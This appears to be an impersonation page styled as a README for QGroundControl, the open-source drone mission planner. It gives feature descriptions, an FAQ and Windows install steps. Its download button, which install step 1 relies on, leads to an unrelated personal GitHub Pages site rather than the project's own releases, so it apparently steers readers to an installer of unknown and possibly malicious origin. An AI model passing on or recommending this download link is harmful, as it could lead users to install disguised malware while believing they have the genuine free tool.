# QGroundControl
QGroundControl is a ground control application for Windows that lets operators design waypoint missions, organize geofences and rally points, and review the plan before vehicle upload.

<p align="center"><img src="https://s.cafebazaar.ir/images/icons/org.mavlink.qgroundcontrol-55f4eabf-23ff-4748-a66a-048114e9cb72_512x512.png?x-img=v1/resize,h_256,w_256,lossless_false/optimize" alt="QGroundControl logo" width="120"/></p>

[![Download QGroundControl](https://img.shields.io/badge/⬇_Download_QGroundControl-00acc1?style=for-the-badge)](https://anitabailey26.github.io/.github/QGroundControl-Mission-App)

## Questions Before You Plan

| Question | Answer |
| --- | --- |
| Is QGroundControl free? | Yes. QGroundControl is open-source software and can be used without a software purchase fee. Vehicle hardware, data services, and field operations may still have separate costs. |
| Which versions of Windows are supported? | Current documentation lists Windows 10 version 1809 or later and Windows 11. Use the latest stable QGroundControl build that is compatible with the workstation and vehicle firmware. |
| How should I check a route before upload? | Confirm the planned home position, mission item order, altitude settings, required command values, terrain profile, route statistics, geofence regions, and rally locations. Resolve incomplete-item indicators, save the plan, and upload only after the map and editor show the intended sequence. |
| How should I research a QGroundControl CVE? | Check the National Vulnerability Database and official project notices using the exact product name and installed version. A result must be read for its affected-version scope; this README does not assert that any specific CVE applies to the current release. |

## Intended Users

* Operators who prepare autonomous routes and want a visual review before transfer.
* Survey teams arranging coverage patterns, camera actions, and mission statistics.
* PX4 and ArduPilot users managing supported vehicle setup and plan data.
* Safety reviewers checking allowed areas, restricted regions, and alternative recovery locations.

## Why Use QGroundControl for Plan Review?

QGroundControl reduces the friction of coordinating a route, its command sequence, and its safety layers in separate utilities. The plan editor keeps numbered waypoints, editable values, terrain context, geofence regions, rally points, and transfer status visible around the same map, making omissions and unsent changes easier to notice before field use.

## Planning Defaults and Controls

**Default mission altitude.** Choose the starting altitude applied to newly created mission items. **Plan-level speed.** Set appropriate cruise or hover assumptions when the connected vehicle supports them. **Altitude mode.** Review whether mission heights use the intended reference before adding more points. **Layer selection.** Move deliberately between Mission, GeoFence, and Rally Points so edits affect the correct part of the plan. **Map and video preferences.** Adjust the QGroundControl interface for the operational display without hiding the status information needed for review.

## Performance in the Planning Workspace

Map responsiveness and plan transfer reliability depend on workstation resources, map data, route complexity, and connection quality. Large survey patterns or detailed safety regions can add more mission items to inspect, so review the plan in logical sections and save it before transfer. If an upload does not complete, retain the local plan, check link status, and retry only after the connection is stable.

## Install QGroundControl on Windows

| Step | What to do |
| --- | --- |
| 1 | Select the download button above to obtain the current QGroundControl Windows setup package. |
| 2 | Open the downloaded installer and follow the setup instructions to add the application and its Windows shortcuts. |
| 3 | Launch QGroundControl from the standard shortcut; use a compatibility or safe-mode shortcut only when addressing display startup problems. |
| 4 | Connect a supported vehicle when ready, or open Plan View to prepare and save a mission before connection. |

## Supported Planning Data

* **Windows:** Windows 10 version 1809 or later, and Windows 11.
* **Vehicle firmware:** Planning and configuration features vary with the connected PX4 or ArduPilot firmware and vehicle type.
* **Plan content:** Mission items, optional geofence data, rally points, and planned home information can be stored together in a plan file.
* **Geospatial output:** A prepared plan can be saved locally, while supported toolbar actions can export route information for compatible mapping workflows.
* **Vehicle transfer:** Missions, geofences, and rally points are uploaded through the active vehicle link when supported.

## Security Review Without Assumptions

**Match advisories to the installed build.** A search phrase such as "NVD QGroundControl CVE" is only a starting point: verify the vendor or project name, affected versions, configuration conditions, and remediation guidance before deciding whether a published record applies, and never infer a current vulnerability from a keyword match alone.

## Map-Centered Mission Tools

* **QGroundControl mission planning map:** Place, select, drag, and reorder waypoint items while viewing route lines and direction.
* **Waypoint editors:** Expand each mission item to check its command, coordinates, altitude, and other required values.
* **Terrain and statistics:** Review the elevation profile, leg information, total distance, estimated duration, and other available planning estimates.
* **Geofence layers:** Draw supported circular or polygon inclusion and exclusion regions and inspect any configured breach response.
* **Rally planning:** Add alternative recovery locations when the connected firmware exposes rally-point support.
* **Transfer awareness:** Save the local plan, watch for unsent-change status, and upload the complete reviewed set to the vehicle.
